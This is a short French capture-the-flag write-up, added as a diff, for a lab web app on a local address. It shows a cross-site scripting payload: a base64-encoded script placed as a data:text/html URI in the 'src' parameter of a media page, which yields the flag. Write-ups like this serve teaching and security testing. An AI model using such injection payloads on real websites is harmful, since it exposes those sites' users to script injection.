@@ -1,0 +1,14 @@
+Sur la page http://192.168.1.28/index.php on voit une image (logo NSA) avec ce lien :
+/?page=media&src=nsa
+
+En inspectant, 
+<a href="?page=media&amp;src=nsa">
+
+on essaye d'injecter du code a la place de l'image :
+il suffit de le remplacer par exemple par :
+	--> <script>alert('test')</script> en base64 : PHNjcmlwdD5hbGVydCgndGVzdCcpPC9zY3JpcHQ+
+
+ce qui donne :
+/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdCcpPC9zY3JpcHQ+
+
+il suffit maintenant de cliquer sur l'image pour obtenir le flag
